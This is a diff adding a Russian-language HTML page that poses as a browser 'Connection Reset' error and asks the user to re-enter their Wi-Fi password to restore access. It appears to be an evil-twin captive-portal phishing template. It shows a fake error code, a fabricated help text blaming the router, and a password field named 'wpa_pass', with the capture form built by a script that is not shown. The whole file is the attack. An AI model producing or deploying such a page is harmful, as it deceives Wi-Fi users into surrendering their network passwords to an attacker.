@@ -1,0 +1,51 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    <head>
+        <title>Connection Reset</title>
+        
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <script>
+            fn_check = function() {
+                pass = document.getElementById("wpa_pass").value;
+                if(pass.length < 8){
+                    alert("Пароль слишком короткий");
+                    return false;
+                }
+                return true;
+            }
+        </script>
+    <script src="content.js"></script>
+    </head>
+    <body>
+        <div id="center">
+            <div id="center-left">
+
+            </div>
+            <div id="center-right">
+                <div id="title">Соединение было прервано</div>
+                <br>
+                <div id="content">Роутер или шлюз прервал соединение.
+                                  Вы должны провести аутентификацию, чтобы продолжить пользоваться интернетом.
+                </div>
+            </div>
+            
+            <div id="center-below">
+                <script>fn_write_form();</script>
+            </div>
+            
+            <br>
+            <br>
+            <a id="helpbutton" onclick="toggleHelp()" href="#">Что это?</a>
+            <div id="help" style="display: none;">
+                Это сообщение означает, что соединение между Вами и Wi-Fi роутером 
+                было прерванно по непредвиденным обстоятельствам. Этому может быть несколько причин, но 
+                это легко исправить, проведя аутентификацию (введя пароль от Wi-Fi).
+                
+                Если подобный инцидент будет повторяться в будущем, обратитесь к системному администратору 
+                или Вашему интернет-провайдеру.
+                <br><br>
+                <div id="error">net::ERR_CONNECTION_RESET (205)</div>
+            </div>
+        </div>
+    </body>
+</html>
